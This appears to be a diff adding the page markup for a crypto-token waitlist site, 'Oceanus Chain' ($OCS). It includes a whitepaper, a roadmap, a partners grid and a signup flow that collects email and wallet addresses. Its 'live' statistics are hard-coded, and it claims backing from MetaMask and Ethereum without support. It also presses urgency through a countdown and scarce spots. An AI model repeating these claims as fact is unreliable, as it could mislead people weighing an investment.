+.share-btn{padding:9px 18px;font-family:'Orbitron',monospace;font-size:9px;letter-spacing:2px;text-decoration:none;border-radius:3px;transition:all .25s;font-weight:700;cursor:pointer;}
+.share-x{background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.2);color:#fff;}
+.share-x:hover{background:#000;border-color:rgba(255,255,255,.5);box-shadow:0 0 12px rgba(255,255,255,.1);}
+.share-tg{background:rgba(0,136,204,.15);border:1px solid rgba(0,136,204,.35);color:#29b6f6;}
+.share-tg:hover{background:rgba(0,136,204,.25);box-shadow:0 0 12px rgba(0,136,204,.2);}
+.btn-close-success{padding:10px 34px;background:transparent;border:1px solid var(--blue);color:var(--blue);font-family:'Orbitron',monospace;font-size:10px;letter-spacing:4px;cursor:pointer;transition:all .28s;border-radius:2px;}
+.btn-close-success:hover{background:var(--blue);color:#000;}
+
+/* ══ PARTNERS ══ */
+.partners-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;}
+.partner-card{background:rgba(0,184,255,.04);border:1px solid rgba(0,184,255,.12);padding:18px 12px 14px;text-align:center;transition:all .3s;cursor:default;border-radius:4px;position:relative;overflow:hidden;}
+.partner-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,184,255,.4),transparent);opacity:0;transition:opacity .3s;}
+.partner-card:hover{background:rgba(0,184,255,.1);border-color:rgba(0,184,255,.3);transform:translateY(-3px);box-shadow:0 8px 24px rgba(0,0,0,.4),0 0 16px rgba(0,184,255,.08);}
+.partner-card:hover::before{opacity:1;}
+.partner-logo-wrap{width:54px;height:54px;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.04);border-radius:50%;border:1px solid rgba(0,184,255,.14);padding:8px;}
+.partner-logo{width:100%;height:100%;object-fit:contain;filter:drop-shadow(0 2px 6px rgba(0,0,0,.5));}
+.partner-name{font-family:'Orbitron',monospace;font-size:9px;letter-spacing:1.5px;color:#fff;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.partner-tag{font-size:7px;letter-spacing:2px;padding:2px 7px;background:rgba(0,184,255,.1);border:1px solid rgba(0,184,255,.22);color:var(--blue);display:inline-block;text-transform:uppercase;}
+@media(max-width:768px){.partners-grid{grid-template-columns:repeat(3,1fr);}}
+@media(max-width:440px){.partners-grid{grid-template-columns:repeat(2,1fr);}}
+.reveal{opacity:0;transform:translateY(16px);transition:opacity .6s ease,transform .6s ease;}
+.reveal.visible{opacity:1;transform:translateY(0);}
+.rd1{transition-delay:.08s;}.rd2{transition-delay:.16s;}.rd3{transition-delay:.24s;}.rd4{transition-delay:.32s;}
+
+/* ══ TOAST ══ */
+/* toast removed */
+
+/* ══ MOBILE RESPONSIVE ══ */
+@media(max-width:768px){
+  body{overflow-y:auto;overflow-x:hidden;}
+  #start-menu,.dsk-icons{display:none;}
+  #start-menu.open{display:block!important;}
+  #site{position:static!important;overflow:visible!important;height:auto!important;}
+  #desktop{position:static;overflow:visible;padding:12px;padding-bottom:60px;display:flex;flex-direction:column;}
+  .os-win{position:relative!important;left:auto!important;top:auto!important;width:100%!important;max-width:100%!important;height:auto!important;max-height:none!important;margin-bottom:12px;border-radius:6px;display:flex!important;animation:none!important;}
+  .win-body{overflow:visible!important;padding:16px 18px;height:auto!important;}
+  .reveal{opacity:1!important;transform:none!important;}
+  .stats-grid{grid-template-columns:1fr 1fr;}
+  .steps-grid{grid-template-columns:1fr;}
+  .wp-phase{flex-direction:column;gap:5px;}
+  .hero-headline{font-size:22px;}
+  .cd-block{min-width:58px;padding:10px 9px;}
+  #ocean-canvas{display:none;}
+  /* Taskbar mobile tweaks */
+  #taskbar{position:fixed;bottom:0;left:0;right:0;z-index:200;padding:0 6px;}
+  #tb-wins{display:none;}
+  .tb-sep{display:none;}
+  #sys-tray{margin-left:0;border-left:none;padding-left:0;gap:8px;}
+  #start-btn{font-size:8px;letter-spacing:1px;padding:4px 10px;}
+}
+@media(max-width:440px){
+  .stats-grid{grid-template-columns:1fr;}
+  .hero-headline{font-size:19px;}
+  .gate-title{font-size:17px;}
+}
+</style>
+</head>
+<body>
+
+<!-- ══ CURSOR ══ -->
+<div id="cursor"></div>
+<div id="cursor-ring"></div>
+
+<!-- ══ CANVAS BACKGROUND ══ -->
+<canvas id="ocean-canvas"></canvas>
+
+<!-- ══════════════════════════════════
+     LOADING — OS BOOT SEQUENCE
+═══════════════════════════════════ -->
+<div id="screen-loading">
+  <svg class="ld-logo" viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="70" cy="70" r="68" stroke="#00B8FF" stroke-width="1.5" opacity="0.3"/>
+    <circle cx="70" cy="70" r="58" stroke="#009DFF" stroke-width="1" opacity="0.15"/>
+    <circle cx="70" cy="70" r="47" stroke="#00B8FF" stroke-width="0.5" opacity="0.1"/>
+    <path d="M70 18C93 18 118 40 118 70C118 100 93 122 70 122C47 122 22 100 22 70C22 40 47 18 70 18Z" stroke="#00B8FF" stroke-width="1.5" fill="none" opacity="0.4"/>
+    <path d="M22 70Q44 44 70 50Q96 56 118 70Q96 84 70 90Q44 96 22 70Z" fill="url(#wg1)" opacity="0.25"/>
+    <path d="M70 22Q100 48 84 70Q100 92 70 118Q40 92 56 70Q40 48 70 22Z" fill="url(#wg2)" opacity="0.28"/>
+    <circle cx="70" cy="70" r="18" fill="#00B8FF" opacity="0.08" stroke="#33CCFF" stroke-width="1.5"/>
+    <circle cx="70" cy="70" r="10" fill="#00B8FF" opacity="0.15"/>
+    <path d="M57 64Q64 57 70 61Q76 57 83 64Q76 71 70 67Q64 71 57 64Z" fill="#33CCFF" opacity="0.55"/>
+    <circle cx="96" cy="42" r="3" fill="#00B8FF" opacity="0.5"/>
+    <circle cx="102" cy="55" r="2" fill="#33CCFF" opacity="0.4"/>
+    <circle cx="44" cy="96" r="2.5" fill="#009DFF" opacity="0.4"/>
+    <defs>
+      <linearGradient id="wg1" x1="22" y1="70" x2="118" y2="70"><stop offset="0" stop-color="#009DFF"/><stop offset="0.5" stop-color="#33CCFF"/><stop offset="1" stop-color="#009DFF"/></linearGradient>
+      <linearGradient id="wg2" x1="70" y1="22" x2="70" y2="118"><stop offset="0" stop-color="#00B8FF"/><stop offset="0.5" stop-color="#33CCFF"/><stop offset="1" stop-color="#009DFF"/></linearGradient>
+    </defs>
+  </svg>
+  <div class="ld-os-brand">
+    <div class="ld-os-title">OCEANUS OS</div>
+    <div class="ld-os-ver">VERSION 2035.1 · ETHEREUM NETWORK EDITION</div>
+  </div>
+  <div class="ld-eth"><span style="color:rgba(100,150,255,.6);font-size:14px;">◆</span>POWERED BY ETHEREUM</div>
+  <div class="ld-text" id="ld-text">Initializing Oceanus Protocol...</div>
+  <div class="ld-bar-wrap"><div class="ld-bar" id="ld-bar"></div></div>
+  <div class="ld-pct" id="ld-pct">0%</div>
+</div>
+
+<!-- ══════════════════════════════════
+     ACCESS GATE — OS LOGIN DIALOG
+═══════════════════════════════════ -->
+<div id="screen-gate">
+  <div class="gate-win">
+    <div class="gate-tb">
+      <span class="gate-tb-icon">🌊</span>
+      <span class="gate-tb-label">OCEANUS OS — PIONEER ACCESS CONTROL</span>
+      <div class="gate-tb-btns">
+        <button class="gtbtn gtbtn-min">—</button>
+        <button class="gtbtn gtbtn-cls">✕</button>
+      </div>
+    </div>
+    <div class="gate-body">
+      <span class="gate-lock">🔒</span>
+      <div class="gate-title">ACCESS RESTRICTED</div>
+      <p class="gate-sub">Only selected pioneers will gain access to the Oceanus ecosystem. Prove your worth and enter the deep.</p>
+      <button class="btn-gate" onclick="enterSite()">ENTER THE DEEP</button>
+      <div class="gate-eth">$OCS — ETHEREUM NETWORK</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     SITE — OCEANUS OS DESKTOP
+═══════════════════════════════════ -->
+<div id="site">
+<div id="desktop">
+
+  <!-- ── DESKTOP ICONS ── -->
+  <div class="dsk-icons">
+    <div class="d-ico" ondblclick="openWindow('win-hero')" title="Oceanus Chain">
+      <span class="d-ico-em">🌊</span>
+      <span class="d-ico-lbl">Oceanus Chain</span>
+    </div>
+    <div class="d-ico" ondblclick="openWindow('win-stats')" title="Ecosystem Stats">
+      <span class="d-ico-em">📊</span>
+      <span class="d-ico-lbl">Ecosystem Stats</span>
+    </div>
+    <div class="d-ico" ondblclick="openWindow('win-leaderboard')" title="Hall of Pioneers">
+      <span class="d-ico-em">🏆</span>
+      <span class="d-ico-lbl">Hall of Pioneers</span>
+    </div>
+    <div class="d-ico" ondblclick="openWindow('win-how')" title="How It Works">
+      <span class="d-ico-em">⚙️</span>
+      <span class="d-ico-lbl">How It Works</span>
+    </div>
+    <div class="d-ico" ondblclick="openWindow('win-whitepaper')" title="Whitepaper">
+      <span class="d-ico-em">📄</span>
+      <span class="d-ico-lbl">Whitepaper</span>
+    </div>
+    <div class="d-ico" ondblclick="openModal()" title="Apply Now">
+      <span class="d-ico-em">✉️</span>
+      <span class="d-ico-lbl">Apply Now</span>
+    </div>
+    <div class="d-ico" ondblclick="openWindow('win-partners')" title="Partners">
+      <span class="d-ico-em">🤝</span>
+      <span class="d-ico-lbl">Partners</span>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       WINDOW: HERO / WELCOME
+  ═════════════════════════════ -->
+  <div class="os-win" id="win-hero" style="width:600px;left:150px;top:36px;max-height:calc(100vh - 90px);">
+    <div class="win-tb" id="tb-win-hero">
+      <span class="win-tb-icon">🌊</span>
+      <span class="win-tb-title">OCEANUS CHAIN — $OCS · Powered by Ethereum</span>
+      <div class="win-ctrls">
+        <button class="wbtn wbtn-min" onclick="minimizeWin('win-hero')">—</button>
+        <button class="wbtn wbtn-max" onclick="maximizeWin('win-hero')">□</button>
+        <button class="wbtn wbtn-cls" onclick="closeWin('win-hero')">✕</button>
+      </div>
+    </div>
+    <div class="win-body" id="hero-body">
+      <div class="reveal"><div class="hero-eyebrow">OCEANUS CHAIN — $OCS</div></div>
+      <div class="reveal rd1"><h1 class="hero-headline">THE FUTURE FLOWS<br>BENEATH THE SURFACE</h1></div>
+      <div class="reveal rd2"><p class="hero-sub">Oceanus Chain is building a next-generation ecosystem where early pioneers gain exclusive access before the tide reaches the world.</p></div>
+      <div class="reveal rd2">
+        <div class="cd-label">⏳ WAITLIST CLOSES IN</div>
+        <div class="countdown-wrap">
+          <div class="cd-block"><span class="cd-num" id="cd-d">15</span><div class="cd-unit">Days</div></div>
+          <div class="cd-sep">:</div>
+          <div class="cd-block"><span class="cd-num" id="cd-h">00</span><div class="cd-unit">Hours</div></div>
+          <div class="cd-sep">:</div>
+          <div class="cd-block"><span class="cd-num" id="cd-m">00</span><div class="cd-unit">Mins</div></div>
+          <div class="cd-sep">:</div>
+          <div class="cd-block"><span class="cd-num" id="cd-s">00</span><div class="cd-unit">Secs</div></div>
+        </div>
+      </div>
+      <div class="reveal rd3"><button class="btn-enter-hero" onclick="openModal()">SECURE YOUR SPOT</button></div>
+      <!-- CTA -->
+      <div class="cta-mini reveal rd4">
+        <p class="cta-mini-eyebrow">THE TIDE IS TURNING</p>
+        <h2 class="cta-title-inner">CLAIM YOUR POSITION<br>IN THE DEEP</h2>
+        <p class="cta-sub-inner">Only <strong style="color:var(--blue);">2,790 spots remain.</strong> Once the waitlist closes, access is exclusive to verified pioneers only.</p>
+        <button class="btn-cta" onclick="openModal()">SECURE YOUR SPOT</button>
+      </div>
+    </div>
+    <div class="win-sb">
+      <span class="wsb-item"><span class="wsb-dot"></span>ETHEREUM MAINNET</span>
+      <span class="wsb-item"><span class="wsb-dot blue"></span>$OCS LIVE</span>
+      <span class="wsb-item" style="margin-left:auto;">OCEANUS OS v2035.1</span>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       WINDOW: ECOSYSTEM STATS
+  ═════════════════════════════ -->
+  <div class="os-win" id="win-stats" style="display:none;width:520px;">
+    <div class="win-tb" id="tb-win-stats">
+      <span class="win-tb-icon">📊</span>
+      <span class="win-tb-title">ECOSYSTEM STATS · Live Network Data</span>
+      <div class="win-ctrls">
+        <button class="wbtn wbtn-min" onclick="minimizeWin('win-stats')">—</button>
+        <button class="wbtn wbtn-max" onclick="maximizeWin('win-stats')">□</button>
+        <button class="wbtn wbtn-cls" onclick="closeWin('win-stats')">✕</button>
+      </div>
+    </div>
+    <div class="win-body" id="stats">
+      <div class="reveal"><div class="sec-label">LIVE NETWORK DATA</div></div>
+      <div class="reveal rd1"><div class="sec-title">ECOSYSTEM METRICS</div></div>
+      <div class="reveal rd2"><div class="sec-line"></div></div>
+      <div class="stats-grid">
+        <div class="stat-card"><span class="stat-num" id="cnt1">7,210</span><div class="stat-lbl">Total Applicants</div></div>
+        <div class="stat-card"><span class="stat-num" id="cnt2">2,790</span><div class="stat-lbl">Spots Remaining</div></div>
+        <div class="stat-card"><span class="stat-num" id="cnt3">12,480</span><div class="stat-lbl">Community Members</div></div>
+        <div class="stat-card"><span class="stat-num" id="cnt4">3,640</span><div class="stat-lbl">Referral Rewards</div></div>
+      </div>
+    </div>
+    <div class="win-sb">
+      <span class="wsb-item"><span class="wsb-dot"></span>LIVE DATA</span>
+      <span class="wsb-item" style="margin-left:auto;">4 METRICS ACTIVE</span>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       WINDOW: LEADERBOARD
+  ═════════════════════════════ -->
+  <div class="os-win" id="win-leaderboard" style="display:none;width:480px;max-height:calc(100vh - 90px);">
+    <div class="win-tb" id="tb-win-leaderboard">
+      <span class="win-tb-icon">🏆</span>
+      <span class="win-tb-title">HALL OF PIONEERS · Top Leaderboard</span>
+      <div class="win-ctrls">
+        <button class="wbtn wbtn-min" onclick="minimizeWin('win-leaderboard')">—</button>
+        <button class="wbtn wbtn-max" onclick="maximizeWin('win-leaderboard')">□</button>
+        <button class="wbtn wbtn-cls" onclick="closeWin('win-leaderboard')">✕</button>
+      </div>
+    </div>
+    <div class="win-body" id="leaderboard">
+      <div class="reveal"><div class="sec-label">HALL OF PIONEERS</div></div>
+      <div class="reveal rd1"><div class="sec-title">TOP PIONEERS</div></div>
+      <div class="reveal rd2"><div class="sec-line"></div></div>
+      <div class="reveal rd2 lb-wrap">
+        <div class="live-ind"><span class="live-dot"></span>LIVE — UPDATING IN REAL TIME</div>
+        <div id="lb-list"></div>
+      </div>
+    </div>
+    <div class="win-sb">
+      <span class="wsb-item"><span class="wsb-dot"></span>LIVE</span>
+      <span class="wsb-item" style="margin-left:auto;">20 PIONEERS RANKED</span>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       WINDOW: HOW IT WORKS
+  ═════════════════════════════ -->
+  <div class="os-win" id="win-how" style="display:none;width:600px;">
+    <div class="win-tb" id="tb-win-how">
+      <span class="win-tb-icon">⚙️</span>
+      <span class="win-tb-title">HOW IT WORKS · Pioneer Protocol</span>
+      <div class="win-ctrls">
+        <button class="wbtn wbtn-min" onclick="minimizeWin('win-how')">—</button>
+        <button class="wbtn wbtn-max" onclick="maximizeWin('win-how')">□</button>
+        <button class="wbtn wbtn-cls" onclick="closeWin('win-how')">✕</button>
+      </div>
+    </div>
+    <div class="win-body" id="how">
+      <div class="reveal"><div class="sec-label">PIONEER PROTOCOL</div></div>
+      <div class="reveal rd1"><div class="sec-title">HOW IT WORKS</div></div>
+      <div class="reveal rd2"><div class="sec-line"></div></div>
+      <div class="steps-grid">
+        <div class="step-card reveal rd1"><div class="step-num">01</div><div class="step-ttl">APPLY</div><div class="step-desc">Submit your email and Ethereum wallet address to secure your place in the Oceanus Chain waitlist before access closes forever.</div></div>
+        <div class="step-card reveal rd2"><div class="step-num">02</div><div class="step-ttl">COMPLETE TASKS</div><div class="step-desc">Follow on X, retweet, join the community and Telegram. Every action earns priority ranking and boosts your ecosystem position.</div></div>
+        <div class="step-card reveal rd3"><div class="step-num">03</div><div class="step-ttl">REFER & RISE</div><div class="step-desc">Share your referral link. Every verified pioneer you bring earns rewards and elevates your rank on the leaderboard.</div></div>
+        <div class="step-card reveal rd4"><div class="step-num">04</div><div class="step-ttl">GAIN ACCESS</div><div class="step-desc">Top pioneers unlock early access, exclusive $OCS allocations, and lifetime pioneer benefits on the Ethereum network.</div></div>
+      </div>
+    </div>
+    <div class="win-sb">
+      <span class="wsb-item"><span class="wsb-dot blue"></span>4 STEPS TO PIONEER STATUS</span>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       WINDOW: WHITEPAPER
+  ═════════════════════════════ -->
+  <div class="os-win" id="win-whitepaper" style="display:none;width:680px;max-height:calc(100vh - 90px);">
+    <div class="win-tb" id="tb-win-whitepaper">
+      <span class="win-tb-icon">📄</span>
+      <span class="win-tb-title">WHITEPAPER · Official Documentation v2035</span>
+      <div class="win-ctrls">
+        <button class="wbtn wbtn-min" onclick="minimizeWin('win-whitepaper')">—</button>
+        <button class="wbtn wbtn-max" onclick="maximizeWin('win-whitepaper')">□</button>
+        <button class="wbtn wbtn-cls" onclick="closeWin('win-whitepaper')">✕</button>
+      </div>
+    </div>
+    <div class="win-body" id="whitepaper">
+      <div class="wp-inner">
+        <div class="reveal"><div class="sec-label">OFFICIAL DOCUMENTATION</div></div>
+        <div class="reveal rd1"><div class="sec-title">WHITEPAPER</div></div>
+        <div class="reveal rd1" style="margin-bottom:6px;"><p style="font-family:'Orbitron',monospace;font-size:11px;letter-spacing:2px;color:rgba(255,255,255,.32);">The Convergence of Layer-1 Blockchain, Next-Gen AI &amp; Web3 Gaming Infrastructure</p></div>
+        <div class="reveal rd2"><div class="sec-line"></div></div>
+
+        <div class="wp-section reveal rd1">
+          <div class="wp-h2">1. Executive Summary</div>
+          <p class="wp-p">The Oceanus Ecosystem is a pioneering, next-generation decentralized infrastructure engineered to bridge the gap between high-performance blockchain technology, advanced Artificial Intelligence (AI), and immersive Web3 Gaming. Built upon the ultra-secure and highly scalable Layer-1/Layer-2 <strong style="color:var(--blue);">Oceanus Chain</strong>, the platform introduces a seamless environment where decentralized applications (dApps), autonomous AI agents, and play-and-own gaming metaverses coexist natively.</p>
+          <p class="wp-p">By eliminating high gas fees, ensuring sub-second transaction finality, and providing built-in AI model compilation, Oceanus is architected to sustain the next billion users in the digital global economy.</p>
+        </div>
+
+        <div class="wp-section reveal rd1">
+          <div class="wp-h2">2. Core Vision &amp; Problem Statement</div>
+          <p class="wp-p">Current Web3 environments suffer from fragmented user experiences, high transaction costs, and isolated systems. Traditional blockchains lack the native computational capability to host complex Artificial Intelligence models or sustain fast-paced gaming logic directly on-chain.</p>
+          <p class="wp-p">Oceanus solves these structural bottlenecks by fusing heavy cryptographic ledger security with high-speed AI processing layers and dynamic gaming asset registries into one unified ecosystem.</p>
+        </div>
+
+        <div class="wp-section reveal rd1">
+          <div class="wp-h2">3. The Three Structural Pillars</div>
+          <div class="wp-pillar">
+            <div class="wp-pillar-icon">🌊</div>
+            <div class="wp-h3">A. Oceanus Chain &amp; Wallet — The Infrastructure Layer</div>
+            <ul class="wp-ul">
+              <li><strong>High-Throughput Consensus:</strong> A customized consensus mechanism optimized for massive data throughput, cross-chain interoperability, and ultimate asset security.</li>
+              <li><strong>Oceanus Wallet:</strong> A hyper-secure, non-custodial digital wallet featuring a premium cyber-oceanic user interface, multi-chain asset routing, and native decentralized exchange (DEX) aggregation.</li>
+            </ul>
+          </div>
+          <div class="wp-pillar">
+            <div class="wp-pillar-icon">🤖</div>
+            <div class="wp-h3">B. Oceanus AI — The Intelligence Core</div>
+            <ul class="wp-ul">
+              <li><strong>On-Chain AI Agents:</strong> Neural network nodes running parallel to the blockchain to optimize smart contract executions, predictive liquidity analytics, and real-time security auditing.</li>
+              <li><strong>Generative Development:</strong> Integrated development kits leveraging automated generative tools, allowing creators to deploy self-optimizing dApps natively inside the ecosystem.</li>
+            </ul>
+          </div>
+          <div class="wp-pillar">
+            <div class="wp-pillar-icon">🎮</div>
+            <div class="wp-h3">C. Mochi Labubu Land — The Gaming &amp; Metaverse Layer</div>
+            <ul class="wp-ul">
+              <li><strong>The Hub:</strong> A flagship Web3 gaming, staking, and interaction metaverse built natively on top of the Oceanus Chain.</li>
+              <li><strong>Dynamic NFTs (dNFTs):</strong> In-game items and characters powered by Oceanus AI — they adapt, level up, and evolve states based on on-chain achievements and player behavior.</li>
+              <li><strong>Economy &amp; Staking:</strong> Users lock assets in dedicated gaming staking pools to generate yield, unlock rare generative cosmetics, and participate in decentralized governance.</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="wp-section reveal rd1">
+          <div class="wp-h2">4. Technical Architecture &amp; Security</div>
+          <div class="wp-arch">
++-------------------------------------------------------------+
+|               MOCHI LABUBU LAND (Gaming Layer)              |
++-------------------------------------------------------------+
+|             OCEANUS AI (Generative &amp; Analytics)             |
++-------------------------------------------------------------+
+|      OCEANUS CHAIN (L1/L2 Infrastructure) + CORE WALLET    |
++-------------------------------------------------------------+</div>
+          <ul class="wp-ul">
+            <li><strong>Smart Contract Guardrails:</strong> Built utilizing audited, gas-optimized execution environments (Solidity/Rust) backed by machine-learning protocols that monitor the network to prevent exploits or flash-loan attacks.</li>
+            <li><strong>Decentralized Storage:</strong> Interfacing directly with advanced off-chain and on-chain storage to guarantee visual gaming assets and AI weights remain fully decentralized and immutable.</li>
+          </ul>
+        </div>
+
+        <div class="wp-section reveal rd1">
+          <div class="wp-h2">5. Tokenomics &amp; Ecosystem Economy</div>
+          <p class="wp-p">The native utility token serves as the primary fuel driving economic sustainability across the network:</p>
+          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-top:14px;">
+            <div class="wp-pillar" style="margin-bottom:0;"><div style="font-size:18px;margin-bottom:5px;">⛽</div><div style="font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:var(--blue);margin-bottom:5px;">NETWORK FEES</div><div style="font-size:12px;color:rgba(255,255,255,.44);">Powers execution fees, data storage, and smart contract validation.</div></div>
+            <div class="wp-pillar" style="margin-bottom:0;"><div style="font-size:18px;margin-bottom:5px;">🎮</div><div style="font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:var(--blue);margin-bottom:5px;">GAMING UTILITY</div><div style="font-size:12px;color:rgba(255,255,255,.44);">Core exchange medium inside the NFT Marketplace and Mochi Labubu Land.</div></div>
+            <div class="wp-pillar" style="margin-bottom:0;"><div style="font-size:18px;margin-bottom:5px;">🤖</div><div style="font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:var(--blue);margin-bottom:5px;">AI COMPUTATION</div><div style="font-size:12px;color:rgba(255,255,255,.44);">Settles fees for AI developer tools, analytical requests, and ML model execution.</div></div>
+            <div class="wp-pillar" style="margin-bottom:0;"><div style="font-size:18px;margin-bottom:5px;">💎</div><div style="font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;color:var(--blue);margin-bottom:5px;">STAKING &amp; YIELD</div><div style="font-size:12px;color:rgba(255,255,255,.44);">Secures the network while distributing rewards to holders and participants.</div></div>
+          </div>
+        </div>
+
+        <div class="wp-section reveal rd1">
+          <div class="wp-h2">6. Strategic Roadmap</div>
+          <div class="timeline">
+            <div class="tl-item">
+              <div class="wp-phase">
+                <div class="wp-phase-num">PHASE 1</div>
+                <div class="wp-phase-content">
+                  <div class="wp-h3">🌊 Deep Blue Genesis</div>
+                  <span class="wp-tag">ACTIVE</span>
+                  <ul class="wp-ul" style="margin-top:9px;">
+                    <li>Ecosystem architectural design and whitepaper publication.</li>
+                    <li>Development and alpha testing of the Oceanus Wallet.</li>
+                    <li>Launch of the Secure Early Access Waitlist page.</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="tl-item">
+              <div class="wp-phase">
+                <div class="wp-phase-num">PHASE 2</div>
+                <div class="wp-phase-content">
+                  <div class="wp-h3">🚀 Tech-Tide Rise</div>
+                  <span class="wp-tag">UPCOMING</span>
+                  <ul class="wp-ul" style="margin-top:9px;">
+                    <li>Public Testnet deployment for Oceanus Chain.</li>
+                    <li>Integration of core on-chain AI monitoring tools.</li>
+                    <li>Alpha-build release and staking integration for Mochi Labubu Land.</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="tl-item" style="padding-bottom:0;">
+              <div class="wp-phase">
+                <div class="wp-phase-num">PHASE 3</div>
+                <div class="wp-phase-content">
+                  <div class="wp-h3">🌐 The Abyss Conquest</div>
+                  <span class="wp-tag">FUTURE</span>
+                  <ul class="wp-ul" style="margin-top:9px;">
+                    <li>Official Mainnet deployment and public node validation.</li>
+                    <li>Launch of the native dynamic NFT Marketplace.</li>
+                    <li>Open-world public release of the Web3 gaming ecosystem.</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+          <p style="margin-top:24px;font-size:11px;color:rgba(255,255,255,.22);letter-spacing:1px;font-family:'Space Mono',monospace;">© 2026 Oceanus Labs. All rights reserved. Built for the future of decentralized innovation.</p>
+        </div>
+      </div>
+    </div>
+    <div class="win-sb">
+      <span class="wsb-item"><span class="wsb-dot blue"></span>OFFICIAL DOC</span>
+      <span class="wsb-item" style="margin-left:auto;">6 SECTIONS · v2035.1</span>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       WINDOW: PARTNERSHIPS
+  ═════════════════════════════ -->
+  <div class="os-win" id="win-partners" style="display:none;width:620px;max-height:calc(100vh - 90px);">
+    <div class="win-tb" id="tb-win-partners">
+      <span class="win-tb-icon">🤝</span>
+      <span class="win-tb-title">PARTNERSHIPS · Oceanus Chain Network</span>
+      <div class="win-ctrls">
+        <button class="wbtn wbtn-min" onclick="minimizeWin('win-partners')">—</button>
+        <button class="wbtn wbtn-max" onclick="maximizeWin('win-partners')">□</button>
+        <button class="wbtn wbtn-cls" onclick="closeWin('win-partners')">✕</button>
+      </div>
+    </div>
+    <div class="win-body">
+      <div class="reveal"><div class="sec-label">VERIFIED PARTNERS</div></div>
+      <div class="reveal rd1"><div class="sec-title">OCEANUS CHAIN PARTNERS</div></div>
+      <div class="reveal rd2"><div class="sec-line"></div></div>
+      <div class="reveal rd2"><p style="font-size:13px;color:rgba(255,255,255,.4);line-height:1.75;margin-bottom:24px;">Oceanus Chain is backed by leading protocols and networks across the Web3 ecosystem. These strategic partnerships power our infrastructure, liquidity, and cross-chain capabilities.</p></div>
+      <div class="partners-grid reveal rd3">
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><polygon points="50,5 95,25 95,75 50,95 5,75 5,25" fill="#e8821a" opacity=".15" stroke="#e8821a" stroke-width="1.5"/><polygon points="50,18 72,30 72,55 50,67 28,55 28,30" fill="none" stroke="#f6851b" stroke-width="2"/><polygon points="50,32 62,39 62,54 50,61 38,54 38,39" fill="#f6851b" opacity=".7"/><circle cx="50" cy="47" r="7" fill="#f6851b"/></svg>
+          </div>
+          <div class="partner-name">MetaMask</div>
+          <div class="partner-tag">WALLET</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><polygon points="50,5 95,50 50,95 5,50" fill="#627eea" opacity=".15" stroke="#627eea" stroke-width="1.5"/><polygon points="50,14 50,57" stroke="#627eea" stroke-width="2.5" stroke-linecap="round"/><polygon points="50,14 78,52 50,65 22,52" fill="none" stroke="#627eea" stroke-width="1.8"/><polygon points="50,65 78,52 50,86 22,52" fill="#627eea" opacity=".5"/><circle cx="50" cy="50" r="6" fill="#627eea"/></svg>
+          </div>
+          <div class="partner-name">Ethereum</div>
+          <div class="partner-tag">LAYER 1</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#00bfa5" stroke-width="1.5" opacity=".4"/><circle cx="50" cy="50" r="28" fill="none" stroke="#00bfa5" stroke-width="2"/><path d="M30 50 Q50 25 70 50 Q50 75 30 50Z" fill="#00bfa5" opacity=".5"/><circle cx="50" cy="50" r="8" fill="#00bfa5"/></svg>
+          </div>
+          <div class="partner-name">AION</div>
+          <div class="partner-tag">NETWORK</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><rect x="10" y="10" width="80" height="80" rx="14" fill="#e3365e" opacity=".12" stroke="#e3365e" stroke-width="1.5"/><path d="M30 50 L50 22 L70 50 L50 78Z" fill="none" stroke="#e3365e" stroke-width="2.2"/><path d="M35 50 L50 30 L65 50 L50 70Z" fill="#e3365e" opacity=".5"/><circle cx="50" cy="50" r="7" fill="#e3365e"/></svg>
+          </div>
+          <div class="partner-name">Akash Network</div>
+          <div class="partner-tag">COMPUTE</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#f7c948" stroke-width="1.5" opacity=".3"/><path d="M50 12 L62 42 L94 42 L68 60 L78 90 L50 72 L22 90 L32 60 L6 42 L38 42Z" fill="none" stroke="#f7c948" stroke-width="1.8"/><path d="M50 28 L58 48 L78 48 L63 59 L68 78 L50 67 L32 78 L37 59 L22 48 L42 48Z" fill="#f7c948" opacity=".45"/></svg>
+          </div>
+          <div class="partner-name">Alpaca Finance</div>
+          <div class="partner-tag">DeFi</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
